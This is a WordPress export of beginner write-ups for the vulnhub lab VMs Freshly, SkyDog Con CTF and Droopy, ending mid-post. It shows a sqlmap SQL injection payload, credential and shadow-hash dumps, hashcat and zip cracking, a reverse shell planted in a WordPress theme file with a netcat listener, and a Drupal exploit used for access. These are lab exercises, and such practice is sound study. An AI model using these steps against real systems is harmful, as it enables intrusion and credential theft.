		<wp:post_date>2016-04-24 14:41:58</wp:post_date>
		<wp:post_date_gmt>2016-04-24 14:41:58</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>walkthrough-zorz</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="pen-testing"><![CDATA[pen-testing]]></category>
		<category domain="post_tag" nicename="security"><![CDATA[security]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<category domain="post_tag" nicename="vulnhub"><![CDATA[vulnhub]]></category>
		<wp:postmeta>
			<wp:meta_key>_oembed_eec5dec5a08fd8d8d07381ab6eeaa95c</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_c72a6cd3e0b256ba14674e6e0a82302c</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_13e9cd768e25642c3e33583a9c66311b</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_9ac2122a7f160d7153740779af7b2e97</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_cbb863ad1e50e972b94eabf7b3de02e0</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_7b0ab40e0ec5e03d8cc9a4604a5172d8</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_f33e9faa7870affabb269ae39327f8f6</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[22116067033]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_4f3c57ffbb9cca9ebed2ebaa58398216</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_87595add559759089909b230abd667ea</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_b84c7e6d53d0923db26206f282efcf88</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_47d8ee5beb0df89ddd226f5ec74265f0</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_406cda81d30521a47b69c7bda6fbc17f</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Walkthrough Freshly</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/04/25/walkthrough-freshly/</link>
		<pubDate>Mon, 25 Apr 2016 21:47:30 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=880</guid>
		<description></description>
		<content:encoded><![CDATA[I did another vulnerable VM. This one is called Freshly and can be found <a href="https://www.vulnhub.com/entry/tophatsec-freshly,118/">here</a>. It is also made by tophatsec, so <a href="http://www.top-hat-sec.com/r4v3ns-blog/new-vm-challenge-freshly">thanks tophatsec</a> for another great VM. Let's get started.

First let's find the machine.
[code lang="bash"]
nmap 192.168.1.1/24
[/code]

Great, now that we got the ip, let's scan it.
[code lang="bash"]
nmap -A -T4 -p- 192.168.1.107                        [12:17:27]

Starting Nmap 7.00 ( https://nmap.org ) at 2016-04-24 12:18 CLST
Nmap scan report for 192.168.1.107
Host is up (0.00058s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp  open  ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-02-17T03:30:05
|_Not valid after:  2025-02-14T03:30:05
8080/tcp open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.45 seconds
[/code]

Okay, so we have a port 80, and SSL-port 443, and port 8080. All web.
On port 80 there is just a star-wars gif. I download it and check it out if exiftool just in case. But nothing of interest.

I fire up ZAP and start doing a Force Browse (DirBusting). 
Meanwhile I check out port 8080 and port 443. Both of them seem to lead to a wordpress-installation. I snoop around and find that there is a user named admin (the default user in wordpress). I try to login with admin/admin in /wp-admin but no result. I also try a dictionary-attack but without any luck. But I am not blocked out, so that means there are no plugins with fail2ban -features.

I try some sqlinjections in the store but without success.

So I go back to ZAP to see what it has found. And I can see that it has found a page called /login.php and phpmyadmin. So I head over to login.php and find a login. I use sqlmap to see if there are any vulnerabilities.

So I make a request and the intercept it in burp suite, and copypaste the request to a file I call request.txt. "user" is the parameter that I am testing for injections.

[code lang="bash"]
./sqlmap.py -r request.txt -p user
[/code]

Okay, so sqlmap found a <a href="http://www.sqlinjection.net/time-based/">time-based blind</a>. 
[code]
---
Parameter: user (POST)
    Type: AND/OR time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT)
    Payload: user=' AND (SELECT * FROM (SELECT(SLEEP(5)))RRpU) AND 'wUfW'='wUfW&amp;password=&amp;s=Submit
---
[/code]

I had never successfully used sqlmap before, so this was a great learning experience. So after finding out that there is a vulnerability I run the following command to get the databases. It really took a long time because it was a time-based attack.

[code]
./sqlmap.py -r request.txt -p user --dbs 
[/code]

Output:

[code]
available databases [7]:
[*] information_schema
[*] login
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] users
[*] wordpress8080
[/code]

Then I wanted the tables and the content, so I ran:
[code]
./sqlmap.py -r request.txt -p user --tables -D wordpress8080

Database: wordpress8080
[1 table]
+-------+
| users |
+-------+
[/code]

[code]
./sqlmap.py -r request.txt -p user --dump -D wordpress8080 -T users                                  [18:45:53]
Database: wordpress8080
Table: users
[1 entry]
+----------+---------------------+
| username | password            |
+----------+---------------------+
| admin    | SuperSecretPassword |
+----------+---------------------+
[/code]

So yeah, not so secret password. I used it to login to wordpress.
This <a href="http://www.binarytides.com/sqlmap-hacking-tutorial/">guide</a> was quite useful to get the hang of sqlmap.

So, admin on a CMS usually means shell. So I went to appearance/editor and then I just copy-pasted my reverse shell into header.php. Probably not the most silent way, but it is easy to remove the code after it has been executed.
Then I fired up netcat. With:
[code]nc -v -l 1234[/code]
-v stands for verbose. -l for listening. And 1234 is the port. The -p flag is not really needed to define the port. 

Make sure that your firewall is open.
[code]sudo ufw allow 1234[/code]

So, now I got a shell with the user daemon
[code]
uid=1(daemon) gid=1(daemon) groups=1(daemon)
[/code]

I create a file in /tmp called linEnum.sh where I copypaste the linEnum-file. Then:
[code]
chmod +x linEnum.sh
./linEnum.sh
[/code]

To enumerate important and interesting files. It outputs a lot of stuff, among others this:
/etc/passwd
[code]
user:x:1000:1000
mysql:x:103:111
candycane:x:1001:1001
# YOU STOLE MY SECRET FILE!
# SECRET = &quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&quot;
[/code]

And the following in /etc/shadow

[code]
root:$6$If.Y9A3d$L1/qOTmhdbImaWb40Wit6A/wP5tY5Ia0LB9HvZvl1xAGFKGP5hm9aqwvFtDIRKJaWkN8cuqF6wMvjl1gxtoR7/:16483:0:99999:7:::
user:$6$MuqQZq4i$t/lNztnPTqUCvKeO/vvHd9nVe3yRoES5fEguxxHnOf3jR/zUl0SFs825OM4MuCWlV7H/k2QCKiZ3zso.31Kk31:16483:0:99999:7:::
mysql:!:16483:0:99999:7:::
candycane:$6$gfTgfe6A$pAMHjwh3aQV1lFXtuNDZVYyEqxLWd957MSFvPiPaP5ioh7tPOwK2TxsexorYiB0zTiQWaaBxwOCTRCIVykhRa/:16483:0:99999:7:::

There is also a message in the shadow-file:
# YOU STOLE MY PASSWORD FILE!
# SECRET = &quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&quot;
[/code]

I thought I had to reach root, so I didn't really think of this as the flag. So I copied the hashes and started running hashcat on them, which was fun as it was the first time. So I ran it an all the three hashes, with the following command.

[code]
./hashcat-cli64.bin -m 1800 -a 0 -o found.txt --remove candycane.hash ~/sectools/SecLists/Passwords/10_million_password_list_top_100000.txt
[/code]

I only found the password for candycane which was "password". I didn't manage to crack the other users. 

Now I wanted to su up for candycane but it didn't work since I didn't have a tty-shell. And [code]
import pty; pty.spawn('/bin/bash')
[/code]

this didn't work. But I found a workaround. 

[code]
echo &quot;import pty; pty.spawn('/bin/bash')&quot; &gt; /tmp/shell.py
ptyhon shell.py
[/code]

So this gave me a tty-shell and I could run su candycane.

So, here I got stuck a while and started looking back in my notes to see if I had missed something. So I took out the content from the databse login

[code]
Database: login
Table: users
[2 entries]
+----------+-----------+
| password | user_name |
+----------+-----------+
| password | candyshop |
| PopRocks | Sir       |
+----------+-----------+

[/code]

And I tried these passwords on user and root. But it didn't work. After many other tries enumerating the system I gave up. And on some other walkthroughs I found that the password for user (which was a sudo-user) and root was SuperSecretPassword. So that was a little bit annoying that I never tried that. And I also found out that it was the same password for the mysql-root user. Which could be found in the login.php-file. So that was a little bit stupid that I never checked that.

<h2>Conclusion</h2>

All in all it was a great VM. I got to learn tools like hashcat and sqlmap, which I am sure will come in handy on other VMs. I also learned about wpscan while reading other walkthroughs. I was surprised that SuperSecretPassword was not found in my password-dictionaries that I tried.

Other things that I missed was playing around with phpmyadmin. I read in some other walkthroughs that you could figure out the DBMS from it. That would have been good.

But at least I got the flags. ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>880</wp:post_id>
		<wp:post_date>2016-04-25 21:47:30</wp:post_date>
		<wp:post_date_gmt>2016-04-25 21:47:30</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>walkthrough-freshly</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="ctr"><![CDATA[CTR]]></category>
		<category domain="post_tag" nicename="pen-testing"><![CDATA[pen-testing]]></category>
		<category domain="post_tag" nicename="security"><![CDATA[security]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<category domain="post_tag" nicename="wargames"><![CDATA[wargames]]></category>
		<wp:postmeta>
			<wp:meta_key>_oembed_9221ff89e72b62de312e61f62f0e4d12</wp:meta_key>
			<wp:meta_value><![CDATA[<div class="embed-binarytides"><blockquote class="wp-embedded-content"><a href="http://www.binarytides.com/sqlmap-hacking-tutorial/">Sqlmap tutorial for beginners &#8211; hacking with sql injection</a></blockquote><script type='text/javascript'><!--//--><![CDATA[//><!--		!function(a,b){"use strict";function c(){if(!e){e=!0;var a,c,d,f,g=-1!==navigator.appVersion.indexOf("MSIE 10"),h=!!navigator.userAgent.match(/Trident.*rv:11./),i=b.querySelectorAll("iframe.wp-embedded-content"),j=b.querySelectorAll("blockquote.wp-embedded-content");for(c=0;c<j.length;c++)j[c].style.display="none";for(c=0;c<i.length;c++)if(d=i[c],d.style.display="",!d.getAttribute("data-secret")){if(f=Math.random().toString(36).substr(2,10),d.src+="#?secret="+f,d.setAttribute("data-secret",f),g||h)a=d.cloneNode(!0),a.removeAttribute("security"),d.parentNode.replaceChild(a,d)}else;}}var d=!1,e=!1;if(b.querySelector)if(a.addEventListener)d=!0;if(a.wp=a.wp||{},!a.wp.receiveEmbedMessage)if(a.wp.receiveEmbedMessage=function(c){var d=c.data;if(d.secret||d.message||d.value)if(!/[^a-zA-Z0-9]/.test(d.secret)){var e,f,g,h,i,j=b.querySelectorAll('iframe[data-secret="'+d.secret+'"]'),k=b.querySelectorAll('blockquote[data-secret="'+d.secret+'"]');for(e=0;e<k.length;e++)k[e].style.display="none";for(e=0;e<j.length;e++)if(f=j[e],c.source===f.contentWindow){if(f.style.display="","height"===d.message){if(g=parseInt(d.value,10),g>1e3)g=1e3;else if(200>~~g)g=200;f.height=g}if("link"===d.message)if(h=b.createElement("a"),i=b.createElement("a"),h.href=f.getAttribute("src"),i.href=d.value,i.host===h.host)if(b.activeElement===f)a.top.location.href=d.value}else;}},d)a.addEventListener("message",a.wp.receiveEmbedMessage,!1),b.addEventListener("DOMContentLoaded",c,!1),a.addEventListener("load",c,!1)}(window,document);//--><!]]]]><![CDATA[></script><iframe sandbox="allow-scripts" security="restricted" src="http://www.binarytides.com/sqlmap-hacking-tutorial/embed/" width="600" height="338" title="Embedded WordPress Post" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" class="wp-embedded-content"></iframe></div>]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_time_9221ff89e72b62de312e61f62f0e4d12</wp:meta_key>
			<wp:meta_value><![CDATA[1461619731]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[22163068225]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Walkthrough SkyDog Con CTF – The Legend Begins</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/04/27/walkthrough-skydog-con-ctf-the-legend-begins/</link>
		<pubDate>Wed, 27 Apr 2016 01:42:23 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=976</guid>
		<description></description>
		<content:encoded><![CDATA[Okay, I wish I could say that I really solved this but I didn't get all the flags. But I am going to do a write up anyways, to not forget what I learned.

The CTF is called SkyDog Con CTF – The Legend Begins, and can be found <a href="https://www.vulnhub.com/entry/skydog-1,142/">here</a>. Thanks <a href="http://www.jamesbower.com/">James Bower</a> for a fun CTF!


<h3>Instructions</h3>
The CTF is a virtual machine and works best in Virtual Box. This OVA was created using Virtual Box 4.3.32. Download the OVA file open up Virtual Box and then select File –&gt; Import Appliance. Choose the OVA file from where you downloaded it. After importing the OVA file above it is best to disable the USB 2.0 setting before booting up the VM. The networking is setup for a NAT Network but you can change this before booting up depending on your networking setup. If you have any questions please send me a message on Twitter @jamesbower and I’ll be happy to help.

<strong>Goal of Sky Dog Con CTF</strong>

The purpose of this CTF is to find all six flags hidden throughout the server by hacking network and system services. This can be achieved without hacking the VM file itself.

<strong>Flags</strong>

The six flags are in the form of flag{MD5 Hash} such as flag{1a79a4d60de6718e8e5b326e338ae533

Flag #1 Home Sweet Home or (A Picture is Worth a Thousand Words)
Flag #2 When do Androids Learn to Walk?
Flag #3 Who Can You Trust?
Flag #4 Who Doesn’t Love a Good Cocktail Party?
Flag #5 Another Day at the Office
Flag #6 Little Black Box

<h3>First flag</h2>
Let's search the network and scan the machine.
[code]
$ nmap -v 192.168.1.1/24                                                                                                [19:03:49]

Nmap scan report for 192.168.1.108
Host is up (0.0053s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

$ nmap -A -T4 -v -p- 192.168.1.108                                                                                      [19:06:08]

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 c8:f7:5b:33:8a:5a:0c:03:bb:6b:af:2d:a9:70:d3:01 (DSA)
|   2048 01:9f:dd:98:ba:be:de:22:4a:48:4b:be:8d:1a:47:f4 (RSA)
|_  256 f8:a9:65:a5:7c:50:1d:fd:71:57:92:38:8b:ee:8c:0a (ECDSA)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 252 disallowed entries (15 shown)
| /search /sdch /groups /catalogs /catalogues /news /nwshp
| /setnewsprefs? /index.html? /? /?hl=*&amp; /?hl=*&amp;*&amp;gws_rd=ssl
|_/addurl/image? /mail/ /pagead/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[/code]

Okay, so we got ssh and port 80. Nmap also reveled that there's a lot of action in robots.

But first I want to check out port 80.
On the first page there is a image. I remember the name of the first flag: "Flag #1 Home Sweet Home or (A Picture is Worth a Thousand Words)". Okay, so I download the image and check it out in exiftool.

[code]
wget http://skydog.dev/SkyDogCon_CTF.jpg

exiftool SkyDogCon_CTF.jpg
[/code]

And BAM first flag. Found in the comment.
[code]
XP Comment                      : flag{abc40a2d4e023b42bd1ff04891549ae2}
[/code]

This is when I started getting cocky. If it is this easy, it's gonna be a breeze. Shame on me.

Now I check out the robots.txt file. And BOOM another flag.

[code]
# Congrats Mr. Bishop, your getting good - flag{cd4f10fcba234f0e8b2f60a490c306e6}
[/code]

So in the robots file there was a lot of entries.

Many of them looked like this:

[code]
For example stuff like this
Allow: /?hl=*&amp;gws_rd=ssl$
Disallow: /?hl=*&amp;*&amp;gws_rd=ssl
Allow: /?gws_rd=ssl$
Allow: /?pt1=true$
[/code]

I was sure that this was meant for some sql-injections. So I fired up sqlmapping, but nothing.

So I figured that I would see which of all the pages worked, because most of them 404ed. So in order to do that in a efficient way (and inefficient, since nikto already told me which pages responded with 200) I figured that it would be fun to do it with bash.

There are probably a million ways to write this code in a better way. But it worked for me.

First I used cut to cut out all the urls and store them in a file I called robbo.
[code lang="bash"]
cut -d/ -f2-5 robots.txt &gt; robbo 
[/code]

Then I wrote and ran this little script, which outputs the headers of the requests into the file output.
[code lang="bash"]
#!/bin/bash

while read p; do
  #echo $p
  echo http://skydog.dev/&quot;$p&quot; &gt;&gt; output
  curl --head http://skydog.dev/&quot;$p&quot; &gt;&gt; output
done &lt;robbo
[/code]

Then I ran grep on that file to show me all the 200s.
[code lang="bash"]
grep 200 -A 3 -B 3 output
[/code]

So yeah, not very efficient. But it led me to this url: http://skydog.dev/Setec/
But that was not really thanks to my crappy script. I had found it when I used the spider in ZAP as well. Anyways, that page led me to this: http://skydog.dev/Setec/Astronomy/ where I found the zipfile Whistler.zip.

I downloaded it and tried to open it. But it required a password. So I started googeling and found fcrackzip. And I started playing around with it. But in the end I ran the wrong command

[code]
$ fcrackzip -D -p rockyou.txt Whistler.zip

possible pw found: yourmother ()
possible pw found: jinglebells ()
possible pw found: 200595 ()
possible pw found: spellman ()
possible pw found: jenny86 ()
possible pw found: julie10 ()
possible pw found: nascar7 ()
possible pw found: millie25 ()
possible pw found: hackett1 ()
possible pw found: chrebet ()
[/code]

It just returned tens of possible passwords. 

I should have run it like this:
[code]
fcrackzip -D -v -u -p rockyou.txt Whistler.zip

found file 'flag.txt', (size cp/uc     50/    38, flags 9, chk 874a)
found file 'QuesttoFindCosmo.txt', (size cp/uc     72/    61, flags 9, chk 83b5)


PASSWORD FOUND!!!!: pw == yourmother
[/code]

Yeah I was stuck here and though that there was something wrong with the program or something. So I cheated a bit and learned the correct way to use fcrackzip.

I got the flag: flag{1871a3c1da602bf471d3d76cc60cdb9b}% and a clue for the next flag:
"Time to break out those binoculars and start doing some OSINT% "

So I started googeling about OSINT. 
Osint stand for Open Source Intelligence. Something I didn't know of before reading about it. After reading about it on wikipedia I gather that it doesn't concern what programmers know of open source. It means more like public. Like public information gathering. It comes from the intelligence community.

Here I got really stuck again. And so I cheated. Again. Sorry. 
I read in another walkthrough that he had taken out words from the movie sneakers imdb and ran it through dirbuster.

So I did that as well.

I took the movie script and downloaded it. Then I wrote the following bash-script:
[code lang="bash"]
#!/bin/bash

for word in $(&lt;sound.txt)
do
    echo &quot;$word&quot; &gt;&gt; sneakersWord2.txt
done
[/code]
It takes sound.txt as input and lines up each word in the file sneakers.txt. Which I then used in ZAP.

So I found the path:
<pre>/PlayTronics/</pre>
In /PlayTronics I got the flag:
http://skydog.dev/PlayTronics/flag.txt
And the next clue. http://skydog.dev/PlayTronics/companytraffic.pcap
A package capture of network traffic. So I ran:
[code]
tcpick -C -yP -r companytraffic.pcap &gt; companytraffic.txt                                                             [/code]
And started poking around in it with grep. But yeah. I didn't really get anywhere with it. This is where I just gave up.

If you want to find the rest of the flags check out <a href="https://research.g0blin.co.uk/skydog-con-ctf-writeup">g0blins great write-up</a> if you haven't already.


<h2>Conclusion</h2>
I really made a lot of mistakes on this one, and some stuff was just over my head. Like somehow remaking the sound-clip from the pcap-file. That would have been cool to do.
I would have easily gotten the zip-file if I just had learned the tool a bit better.
I should also have read the instructions better! If I had done that I would have figured out that I of course should have tried to crack the MD5 hashes.

I got to play around with some more unix commands like cut, and writing a bit in bash which is always useful. I also got to try out fcrackzip, although I doubt it will ever be useful. It seems like a really old technology.

So all in all a fun CTF and I learned some more. Which in the end is the most important thing.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>976</wp:post_id>
		<wp:post_date>2016-04-27 01:42:23</wp:post_date>
		<wp:post_date_gmt>2016-04-27 01:42:23</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>walkthrough-skydog-con-ctf-the-legend-begins</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="ctf"><![CDATA[CTF]]></category>
		<category domain="post_tag" nicename="pen-testing"><![CDATA[pen-testing]]></category>
		<category domain="post_tag" nicename="security"><![CDATA[security]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<category domain="post_tag" nicename="vulnhub"><![CDATA[vulnhub]]></category>
		<category domain="post_tag" nicename="wargames"><![CDATA[wargames]]></category>
		<wp:postmeta>
			<wp:meta_key>_oembed_9dc51cac855cb2567a6b9add0a5c1b17</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_1cbc5c125eadeac55504e39cd1423631</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[22204581866]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_70ee67d5f11d28e2a830edf536d701e0</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Walkthrough Droopy</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/05/01/walkthrough-droopy/</link>
		<pubDate>Sun, 01 May 2016 22:35:02 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=1091</guid>
		<description></description>
		<content:encoded><![CDATA[Another walkthrough. This time for the Droopy-vm. It can be found here on <a href="https://www.vulnhub.com/entry/droopy-v02,143/">vulnhub.com</a>

I tried out netdiscover, just to learn something new. I have seen that other people use it. It turns out that it works to find hosts on the network. It works by sending out ARP-requests throughout the network and loggin the requests. I am not really sure if nmap is using a different technique. But it is good to know that there is an alternative to nmap for it.


[code lang="bash"]
netdiscover -r 192.168.1.0/24
 Currently scanning: Finished!   |   Screen View: Unique
Hosts                                                                 
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                                                     
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.1     e8:de:27:31:15:ee      1      60  TP-LINK TECHNOLOGIES CO.,LTD.                                                                     
 192.168.1.104   08:00:27:65:24:9c      1      60  Cadmus Computer Systems 
[/code]

So I ran nmap.
[code lang="bash"]
nmap -vvv -A -T4 -O 192.168.1.104

PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: B6341DFC213100C61DB4FB8775878CEC
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 36 disallowed entries 
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php 
| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/ 
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/ 
| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/ 
|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Welcome to La fraude fiscale des grandes soci\xC3\xA9t\xC3\xA9s | La fraud...
MAC Address: 08:00:27:65:24:9C (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.4

[/code]

First I thought that the MD5 was a flag or something. But then I read that that is the standard way for nmap to output if it doesn't know the service.

The robots file is just filled with stuff.

Among the many files was this.
http://droopy.dev/CHANGELOG.txt
 Drupal 7.30, 2014-07-24 

This reminded me about a huge vulnerability that was in drupal a few years ago, that I had heard about.

I continued the scanning by running nikto and then checking out the info.php file to see what I could find.

This is some of all the info.
[code]
http://droopy.dev/info.php
PHP Version 5.5.9-1ubuntu4.5
Hostname:Port droopy.knight139.co.uk:80 
User/Group www-data(33)/33 
Apache Version Apache/2.4.7 (Ubuntu) 
Loaded Modules core mod_so mod_watchdog http_core mod_log_config mod_logio mod_version mod_unixd mod_access_compat mod_alias mod_auth_basic mod_authn_core mod_authn_file mod_authz_core mod_authz_host mod_authz_user mod_autoindex mod_deflate mod_dir mod_env mod_filter mod_mime prefork mod_negotiation mod_php5 mod_rewrite mod_setenvif mod_status 

DOCUMENT_ROOT /var/www/html 
SERVER_ADMIN webmaster@localhost 

Mysql
Client API version 5.5.40 

PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 
[/code]
The default apache-page was also found.
http://droopy.dev/index.html

I tried to brute-force the login. This made the server block my IP. And I also think I made it run out of memory or something. Because is subsequently crashed. Great. So I restarted the VM fresh again. And this time I checked out the drupal-exploit. 

So I searched for exploits on the <a href="https://www.exploit-db.com/search/?order_by=date&amp;order=desc&amp;pg=1&amp;action=search&amp;description=Drupal">exploits-database.</a>
There I found four exploits that are called something along the lines of: Drupal Core &lt;= 7.32 - SQL Injection.
Or similar. Two were written in python two in php. I just picked one, and downloaded it and ran it. Which was pretty stupid, because I created, by default in the exploit, a user with the username admin. So I overwrote the original user.
So once I later gained access, and checked in the database. I only found my own user. Otherwise I would have been able to crack the hash of the original user and that password could have been good to know.

Anyhow, I gained access and after some googeling I figured out how to allow php in drupal (modules/php-filter). And I uploaded the php-reverse-shell.ph that I found here:
usr/share/laudanum/php/php-reverse-shell.php

<h2>Privilege escalation</h2>
Now I had shell for user: www-data. So I went to /tmp and started netcat to transfer my enumeration-file.
[code]
nc -lvp 3333 &gt; enum.sh
[/code]

Then I sent the file with:
[code]
nc 192.168.1.104 3333 &lt; enum.sh
[/code]
Then: chmod +x enum.sh

Among other things I found:
[code lang="bash"]
uid=1000(gsuser) gid=1000(gsuser) groups=1000(gsuser),24(cdrom),30(dip),46(plugdev),110(lpadmin
